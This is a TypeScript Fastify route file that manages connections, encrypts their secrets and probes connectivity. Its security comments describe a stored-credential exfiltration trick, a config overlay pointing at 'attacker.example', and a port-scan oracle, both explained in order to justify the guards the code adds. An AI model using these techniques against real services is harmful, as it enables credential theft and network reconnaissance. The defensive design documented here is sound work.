import { z } from 'zod';
import type { FastifyPluginAsync } from 'fastify';
import {
  ConnectionKindSchema,
  ConnectionPublicSchema,
  NewConnectionSchema,
  canonicalStringify,
  type Connection,
  type ConnectionProbeResult,
} from '@autonomy-studio/shared';
import {
  connectionNotReadyReason,
  createConnection,
  createSecret,
  deleteConnection,
  deleteSecret,
  getConnection,
  getSecretByRef,
  listConnectionsPage,
  updateConnection,
  updateSecretCiphertext,
} from '../repo/index.js';
import { newId } from '../repo/ids.js';
import { regateTriggersForConnection } from '../run/connection-readiness.js';
import { configKeysChangedByOverlay, probeConnection } from '../connectors/probe.js';
import { SecretDecryptionError, decrypt, encrypt } from '../secrets/secrets.js';
import { NotFoundError } from '../errors.js';
import { pageArgsFromQuery, requireOwned } from './util.js';
import { exportConnection } from '../portability/index.js';

/**
 * The client-facing write body: everything `NewConnectionSchema` needs
 * EXCEPT `ownerId` (stamped from `request.principal`, never client-supplied
 * — see the auth seam) and `secretRef` (an internal FK to the `secrets`
 * table; a client can never set it directly). In its place, an OPTIONAL
 * plaintext `secret` — encrypted server-side into a `secrets` row before
 * anything touches the DB.
 */
const ConnectionWriteBodySchema = NewConnectionSchema.omit({
  ownerId: true,
  secretRef: true,
  parameters: true,
}).extend({
  secret: z.string().min(1).optional(),
  /**
   * #2 L13b — re-declared WITHOUT `ConnectionSchema`'s `.default([])`, and the
   * difference is load-bearing: Zod applies a `.default()` even through the
   * PATCH handler's `.partial()` (a recorded repo gotcha), so inheriting it
   * would turn EVERY patch that omits `parameters` — e.g. the web form's
   * rename, which sends only `{name, kind, config}` — into a silent reset of
   * the stored allowlist to `[]`, permanently failing every pipeline bound to
   * those parameters. `.optional()` leaves the key ABSENT when the body omits
   * it, so `updateConnection`'s spread preserves the stored value; the CREATE
   * path gets `[]` from `NewConnectionSchema`'s own default inside
   * `createConnection`.
   */
  parameters: z.array(z.string().min(1)).optional(),
});

function toPublic(connection: Connection) {
  return ConnectionPublicSchema.parse(connection);
}

/**
 * #1191 — the DRAFT probe body: a config that exists only in the form, with no
 * row behind it. `kind` is parsed through the shared enum, so an unknown kind is
 * an honest 400 rather than a sentence about a missing adapter.
 */
const ProbeDraftBodySchema = z.object({
  kind: ConnectionKindSchema,
  config: z.record(z.string(), z.unknown()),
  secret: z.string().min(1).optional(),
});

/**
 * The SAVED-row probe body — an optional overlay on the stored connection.
 * Both keys absent means "probe exactly what is stored", which is what the
 * connections list needs; the edit form sends the config on screen.
 */
const ProbeSavedBodySchema = z.object({
  config: z.record(z.string(), z.unknown()).optional(),
  secret: z.string().min(1).optional(),
});

export const connectionsRoutes: FastifyPluginAsync = async (fastify) => {
  const { db, masterKey } = fastify;

  fastify.post('/api/connections', async (request, reply) => {
    const { secret, ...rest } = ConnectionWriteBodySchema.parse(request.body);

    let secretRef: string | null = null;
    if (secret !== undefined) {
      const ciphertext = await encrypt(secret, masterKey);
      const secretRow = createSecret(db, { ref: newId('secref'), ciphertext });
      secretRef = secretRow.ref;
    }

    const created = createConnection(db, {
      ...rest,
      ownerId: request.principal.ownerId,
      secretRef,
    });
    reply.status(201).send(toPublic(created));
  });

  fastify.get('/api/connections', async (request) => {
    // #534 — keyset-paginated envelope `{ items, nextCursor }`; the public
    // projection is applied per item, `nextCursor` passes through opaque.
    const page = listConnectionsPage(
      db,
      request.principal.ownerId,
      pageArgsFromQuery(request.query),
    );
    return { items: page.items.map(toPublic), nextCursor: page.nextCursor };
  });

  fastify.get<{ Params: { id: string } }>('/api/connections/:id', async (request) => {
    const row = requireOwned(
      getConnection(db, request.params.id),
      request.principal,
      'connection',
      request.params.id,
    );
    return toPublic(row);
  });

  fastify.patch<{ Params: { id: string } }>('/api/connections/:id', async (request) => {
    const existing = requireOwned(
      getConnection(db, request.params.id),
      request.principal,
      'connection',
      request.params.id,
    );
    const { secret, ...rest } = ConnectionWriteBodySchema.partial().parse(request.body);

    let secretRef = existing.secretRef;
    if (secret !== undefined) {
      const ciphertext = await encrypt(secret, masterKey);
      const existingSecret = existing.secretRef ? getSecretByRef(db, existing.secretRef) : null;
      if (existingSecret) {
        // Rotate the ciphertext IN PLACE, under the same stable `ref` — the
        // connection's `secretRef` never changes on a rotation.
        updateSecretCiphertext(db, existingSecret.id, ciphertext);
      } else {
        // No secret existed yet (or the ref was somehow dangling, which the
        // FK should prevent) — mint a brand-new one.
        const created = createSecret(db, { ref: newId('secref'), ciphertext });
        secretRef = created.ref;
      }
    }

    // #3 G8b-2 — the reverse-gate. If this PATCH leaves the connection UNREADY
    // (the only reachable ready→unready PATCH transition is a `kind` change to a
    // secret-requiring kind with no secret: `not_required`→`needs_secret` — a
    // secret cannot be cleared here and `enabled` is server-pinned), disable
    // every dependent enabled trigger so its `enabled` flag can't outlive the
    // connection's readiness (the dispatch gate would refuse each fire, leaving
    // an "enabled" trigger that silently never runs). The update + the dependent
    // disables land in ONE transaction (the service's own tx nests as a
    // SAVEPOINT), mirroring `archivePipeline`'s atomicity — never a committed
    // unready connection with a still-enabled dependent. A supply (needs_secret→
    // ready) leaves the connection ready, so no dependent is touched.
    const result = db.transaction(() => {
      const u = updateConnection(db, existing.id, { ...rest, secretRef });
      if (!u) return null;
      const disabled =
        connectionNotReadyReason(u) !== null ? regateTriggersForConnection(db, u.id) : [];
      return { connection: u, disabled };
    });
    if (!result) throw new NotFoundError('connection', existing.id);
    // Post-commit, and only when a dependent actually flipped — drop the
    // now-disabled triggers' pending wakeups (the alarm clock owns its own db).
    if (result.disabled.length > 0) fastify.scheduler.sync();
    return toPublic(result.connection);
  });

  fastify.delete<{ Params: { id: string } }>('/api/connections/:id', async (request, reply) => {
    const existing = requireOwned(
      getConnection(db, request.params.id),
      request.principal,
      'connection',
      request.params.id,
    );

    // Order matters: `connections.secret_ref -> secrets.ref` is
    // `ON DELETE RESTRICT`, so the secret row cannot be deleted while this
    // connection still references it. Delete the connection FIRST (which
    // drops the only reference), THEN delete its secret — this is the
    // "delete the secret too" choice (vs. leaving it orphaned): a
    // connection's secret is exclusively its own in this MVP (nothing else
    // ever points at the same `ref`), so nothing else can be left dangling.
    // #3 G8b-2 — delete + reverse-gate + secret cleanup in ONE transaction. The
    // delete must precede the reverse-gate scan: once the connection row is gone,
    // a dependent trigger's version folds it to `missing` (an unready reason), so
    // `regateTriggersForConnection` disables every dependent enabled trigger —
    // keeping the `enabled` flag honest for a trigger bound to a now-vanished
    // connection (there is no triggers→connections FK; this service is the only
    // mechanism). The secret delete stays last (the connection was the sole
    // `secret_ref` holder; ON DELETE RESTRICT requires the reference gone first).
    const disabled = db.transaction(() => {
      deleteConnection(db, existing.id);
      const flipped = regateTriggersForConnection(db, existing.id);
      if (existing.secretRef) {
        const secretRow = getSecretByRef(db, existing.secretRef);
        if (secretRow) deleteSecret(db, secretRow.id);
      }
      return flipped;
    });
    if (disabled.length > 0) fastify.scheduler.sync();
    reply.status(204).send();
  });

  /**
   * #1191 — probe a DRAFT connection: the "Test connection" button on a form
   * that has not been saved. Touches no row, writes nothing.
   *
   * SECURITY. This lets an authenticated principal make the server open a
   * socket to a host they name, and read back an adapter sentence that
   * distinguishes "nothing is listening" from "that host does not resolve" from
   * "the host did not answer" — i.e. a usable internal-network port-scan oracle,
   * with no persisted row and no run log behind it.
   *
   * That is stated rather than waved away, but it is not a new grant of REACH:
   * the same principal can already `POST /api/connections` and run a pipeline
   * against any host, and `auth/principal.ts` stamps one local owner on every
   * request, so anyone who can reach this port already holds full owner
   * authority. What the draft route genuinely adds is CONVENIENCE and the
   * absence of a durable trace — worth an audit seam, which is filed rather
   * than built here. What bounds it in this fire: `probeConnection`'s
   * process-wide concurrency cap and its per-probe backstop.
   */
  fastify.post('/api/connections/test', async (request) => {
    const body = ProbeDraftBodySchema.parse(request.body);
    return probeConnection({
      registry: fastify.connectors,
      kind: body.kind,
      config: body.config,
      secret: body.secret ?? null,
    });
  });

  /**
   * #1191 — probe a SAVED connection, optionally overlaying the config on
   * screen. This is the route the EDIT form needs and the draft route cannot
   * replace: the form's secret input is blank when the operator is keeping the
   * stored secret, so a draft probe would send no secret and report a FALSE
   * credential failure for every connection that has one.
   *
   * SECURITY — the credential boundary, and the reason this route is not simply
   * "draft, but with the stored password filled in".
   *
   * Reaching the stored plaintext at all is a capability POST-ing a draft does
   * not have. Combine it with a free-form config overlay and you get an
   * exfiltration primitive: `{config: {...stored, host: 'attacker.example'}}`
   * with no `secret` would decrypt this connection's credential and send it
   * wherever the request body said. For `postgres` that is the password; for
   * `anthropic_api`, `openai_api` and `http` it is the API key, sent as an auth
   * header to `config.baseUrl` by their own probes.
   *
   * The usual answer — the owner could PATCH those keys anyway — does not hold
   * here, because a PATCH is a persisted, inspectable mutation that STILL never
   * reveals the plaintext. Reading a secret out is the one thing no other route
   * offers, so this is the one route that has to earn it.
   *
   * THE RULE IS TOTAL: falling back to the stored secret requires the config to
   * be EXACTLY as stored. Not "no dangerous key changed" — no key changed.
   *
   * The first version of this asked `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS`
   * which keys were dangerous, and that was a hole, not a subtlety: the table is
   * empty for the three API-key kinds above, so the guard silently permitted
   * exactly the exfiltration it was written to stop, for the kinds whose
   * credential is easiest to spend. An allowlist of dangerous keys is a
   * standing bet that no adapter will ever grow a new way to send a secret
   * somewhere, and it fails OPEN. Comparing the whole config cannot.
   *
   * The refusal stays narrow where narrowness is free, and each exemption is a
   * fact about the request rather than a guess about a kind: it does not fire
   * when the body supplies its own secret (nothing stored is spent), nor when
   * the connection holds no secret (there is nothing to exfiltrate — which is
   * what keeps every `fs`/`sqlite` edit probeable), nor when no config overlay
   * was sent at all. It names the changed keys and the two ways forward rather
   * than failing blank.
   */
  fastify.post<{ Params: { id: string } }>('/api/connections/:id/test', async (request) => {
    const existing = requireOwned(
      getConnection(db, request.params.id),
      request.principal,
      'connection',
      request.params.id,
    );
    const body = ProbeSavedBodySchema.parse(request.body ?? {});
    const config = body.config ?? existing.config;

    let secret: string | null = body.secret ?? null;
    const usingStoredSecret = body.secret === undefined && existing.secretRef !== null;
    if (usingStoredSecret && body.config !== undefined) {
      const changed = configKeysChangedByOverlay(existing.config, body.config);
      if (changed.length > 0) {
        const result: ConnectionProbeResult = {
          ok: false,
          error:
            `this test would spend the stored secret on settings the saved connection does not have ` +
            `(${changed.join(', ')} changed) — save the change, or type the secret to test it here`,
        };
        return result;
      }
    }

    if (usingStoredSecret && existing.secretRef !== null) {
      const row = getSecretByRef(db, existing.secretRef);
      // A dangling `secretRef` should be impossible (there is an FK), and this
      // route is not the place to discover otherwise loudly: `null` is exactly
      // what "this connection has no usable secret" means, and every
      // secret-requiring adapter already answers that with its own sentence
      // (postgres: "this postgres connection has no secret …").
      if (row) {
        try {
          secret = await decrypt(row.ciphertext, masterKey);
        } catch (err) {
          // NEVER echo a decrypt error — it can carry ciphertext/key detail.
          // The executor takes the same posture at its own decrypt.
          const result: ConnectionProbeResult = {
            ok: false,
            error:
              err instanceof SecretDecryptionError
                ? "this connection's secret could not be decrypted with the current master key"
                : "this connection's secret could not be read",
          };
          return result;
        }
      }
    }

    return probeConnection({
      registry: fastify.connectors,
      kind: existing.kind,
      config,
      secret,
    });
  });

  // Version-stamped JSON export (P1c). `exportConnection` does its own
  // owner-check (404 if not owned) and NEVER includes `secretRef`.
  // #3 G1: canonical-JSON body (see the pipelines export route).
  fastify.get<{ Params: { id: string } }>('/api/connections/:id/export', async (request, reply) => {
    const envelope = exportConnection(db, request.params.id, request.principal.ownerId);
    return reply.type('application/json').send(canonicalStringify(envelope));
  });
};
